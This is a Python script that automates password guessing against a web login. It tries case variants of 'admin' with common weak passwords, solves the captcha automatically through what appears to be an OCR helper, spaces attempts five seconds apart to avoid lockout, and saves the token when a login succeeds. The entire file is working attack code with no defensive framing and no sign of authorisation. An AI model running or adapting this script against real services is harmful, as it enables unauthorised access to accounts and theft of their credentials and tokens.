import sys, json, time, re
import run as R

PLAN = [
 {'variant':'admIn','password':'Admin@123'},
 {'variant':'ADmin','password':'admin@123'},
 {'variant':'aDmin ','password':'Admin123'},
 {'variant':'Admin','password':'Admin@2024'},
 {'variant':'adMin','password':'Jydsj@2024'},
]
last=0.0
for i,item in enumerate(PLAN, start=100):
    dt=time.time()-last
    if dt<5: time.sleep(5-dt)
    user,pw=item['variant'],item['password']
    rc=R.get_code()
    if not rc:
        R.log('SKIP %r/%r no captcha'%(user,pw)); continue
    uuid,ans,expr,tb,ts=rc
    body={"tenantId":"000000","username":user,"password":pw,"code":ans,"uuid":uuid,
          "clientId":R.CLIENT_ID,"grantType":"password"}
    st,txt,raw=R.post_login(body)
    last=time.time()
    rec={'idx':i,'username':user,'password':pw,'req':body,'ocr':{'beta':tb,'std':ts,'expr':expr},'status':st,'resp':txt}
    open('att_%02d_%s.json'%(i,re.sub(r'\W','_',user)),'w',encoding='utf-8').write(json.dumps(rec,ensure_ascii=False,indent=1))
    R.log('ATT %02d user=%r pw=%r ocr=(%r|%r) expr=%s -> %s %s'%(i,user,pw,tb,ts,expr,st,txt[:300]))
    if '"code":200' in txt:
        open('SUCCESS.json','w',encoding='utf-8').write(json.dumps(rec,ensure_ascii=False,indent=1))
        open('token_resp.txt','w').write(txt)
        R.log('SUCCESS user=%r pw=%r'%(user,pw)); break
